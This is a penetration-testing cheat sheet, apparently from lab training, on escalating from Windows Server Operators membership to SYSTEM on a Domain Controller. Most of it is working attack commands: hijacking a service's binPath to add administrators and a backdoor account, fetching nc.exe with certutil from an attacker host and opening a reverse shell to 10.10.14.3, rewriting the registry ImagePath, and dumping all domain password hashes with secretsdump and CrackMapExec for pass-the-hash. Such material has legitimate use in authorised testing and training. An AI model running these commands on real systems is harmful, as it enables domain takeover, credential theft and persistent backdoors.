## Server Operators

Server Operators is a Domain Controller-only group that grants members `SeBackupPrivilege`, `SeRestorePrivilege`, and full control over many Windows services that run as `NT AUTHORITY\SYSTEM`. The service control capability is the most direct path to compromise. 

***

## Why Service Control Equals SYSTEM

When you modify a service's binary path and start it, Windows executes whatever command you placed in that path under the service account's security context. For services running as `LocalSystem`, that means your command runs as SYSTEM, regardless of your own privilege level. 

```
Server Operators member -> SERVICE_ALL_ACCESS on SYSTEM services
    |
    v
sc config <service> binPath= "<malicious command>"
    |
    v
sc start <service>
    |
    v
Command executes as NT AUTHORITY\SYSTEM
```

***

## Step 1: Confirm Membership and Find a Target Service

```cmd
:: Confirm Server Operators membership
whoami /groups | findstr "Server Operators"
net localgroup "Server Operators"

:: Find a SYSTEM-level service to abuse - check start name for LocalSystem
sc qc AppReadiness
:: SERVICE_START_NAME: LocalSystem  <- this is what you want

:: Find all LocalSystem services (faster)
for /f "tokens=2" %s in ('sc query type= win32 state= all ^| findstr "SERVICE_NAME"') do @sc qc %s 2>nul | findstr /i "LOCAL_SYSTEM\|LocalSystem" >nul && echo %s

:: PowerShell equivalent - list all SYSTEM services
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} |
    Select-Object Name, StartName, State, PathName
```

### Check Service Permissions with PsService

```cmd
:: Verify Server Operators has SERVICE_ALL_ACCESS
c:\Tools\PsService.exe security AppReadiness
:: Look for: [ALLOW] BUILTIN\Server Operators -> All

:: Alternatively use sc.exe sdshow and check for Server Operators SID (S-1-5-32-549)
sc.exe sdshow AppReadiness
:: Look for: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)
:: SO = Server Operators built-in SID
```

***

## Step 2: Modify Service Binary Path

### Option A: Add Current User to Local Admins (Persistent, Low Noise)

```cmd
:: Add attacker account to Administrators
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS

:: Start the service - it will fail (expected) but the command runs first
sc start AppReadiness
:: [SC] StartService FAILED 1053 - this is normal

:: Confirm the user was added
net localgroup Administrators
```

### Option B: Reverse Shell as SYSTEM (No Persistent Change Needed)

```cmd
:: Transfer nc.exe to target first
certutil -urlcache -split -f http://10.10.14.3/nc.exe C:\Windows\Temp\nc.exe

:: Set up listener on attack machine
:: nc -lnvp 8443

:: Modify service to spawn reverse shell
sc config AppReadiness binPath= "cmd /c C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd"
sc start AppReadiness
:: Service will fail to start but nc.exe runs first as SYSTEM
```

### Option C: Direct Command Execution as SYSTEM

```cmd
:: Create another admin account as a backdoor
sc config AppReadiness binPath= "cmd /c net user hacker Pass1! /add && net localgroup Administrators hacker /add"
sc start AppReadiness

:: Or enable WinRM for remote management access
sc config AppReadiness binPath= "cmd /c powershell Enable-PSRemoting -Force"
sc start AppReadiness
```

### Option D: Service Binary Path via Registry (Alternative Method)

```cmd
:: Direct registry modification of ImagePath
reg add "HKLM\System\CurrentControlSet\services\AppReadiness" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\nc.exe -e powershell.exe 10.10.14.3 8443" /f
reg query "HKLM\System\CurrentControlSet\services\AppReadiness" /v ImagePath

:: Start service
sc start AppReadiness
```

***

## Step 3: Leverage Local Admin Access on the DC

Once you have local admin on the Domain Controller, the domain is fully compromised.

### Verify Access with CrackMapExec

```bash
# Test local admin access
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
# [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)

# If credentials are a hash (pass-the-hash)
crackmapexec smb 10.129.43.9 -u server_adm -H cf3a5525ee9414229e66279623ed5c58
```

### Dump NTDS.dit (All Domain Hashes)

```bash
# Method 1: secretsdump.py - targeted (just the administrator account)
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
# Output: Administrator:500:aad3b435b51404ee...:cf3a5525ee9414229e66279623ed5c58:::

# Method 2: secretsdump.py - dump all domain accounts
secretsdump.py server_adm@10.129.43.9 -just-dc-ntlm

# Method 3: secretsdump.py - full dump including Kerberos keys
secretsdump.py server_adm@10.129.43.9 -just-dc

# Method 4: CrackMapExec - dump NTDS via DRSUAPI
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!' --ntds
# All hashes saved to ~/.cme/logs/DC_ntds.dit

# Method 5: CrackMapExec - dump via VSS (Volume Shadow Copy)
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!' --ntds vss

# Method 6: Pass-the-hash with obtained hash
secretsdump.py -hashes aad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 administrator@10.129.43.9
```

***

## Cleanup

```cmd
:: Restore original service binary path after engagement
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
sc start AppReadiness
sc query AppReadiness

:: Remove backdoor user
net user hacker /delete

:: Remove from local admins if added
net localgroup Administrators server_adm /delete

:: Verify service is back to normal
sc qc AppReadiness
```

***

## Finding Other Exploitable Services

The AppReadiness service is used as an example but the same technique applies to any service where Server Operators has full control: 

```powershell
# Find all services where Server Operators SID (S-1-5-32-549) has write access
$services = Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}
foreach ($svc in $services) {
    $sddl = (sc.exe sdshow $svc.Name) -join ""
    if ($sddl -match "SO") {
        Write-Host "[+] $($svc.Name) - Server Operators has access"
    }
}

# Quick check with accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Server Operators" *
:: Lists all services where Server Operators has write control
```

***

## Full Attack Flow

```
whoami /groups -> "Server Operators" confirmed
        |
        v
Find SYSTEM service with Server Operators full access:
sc qc <service> -> StartName: LocalSystem
PsService.exe security <service> -> [ALLOW] BUILTIN\Server Operators: All
        |
        v
Goal?
  |-- Quick SYSTEM shell -> sc config binPath= "nc.exe 10.10.14.3 8443 -e cmd" -> sc start
  |-- Persistent access  -> sc config binPath= "net localgroup Administrators <user> /add" -> sc start
        |
        v
Once local admin on DC:
crackmapexec smb <DC_IP> -u <user> -p <pass> -> (Pwn3d!)
secretsdump.py <user>@<DC_IP> -just-dc-ntlm -> all domain hashes
        |
        v
Pass-the-hash or crack -> Domain Admin access confirmed
```
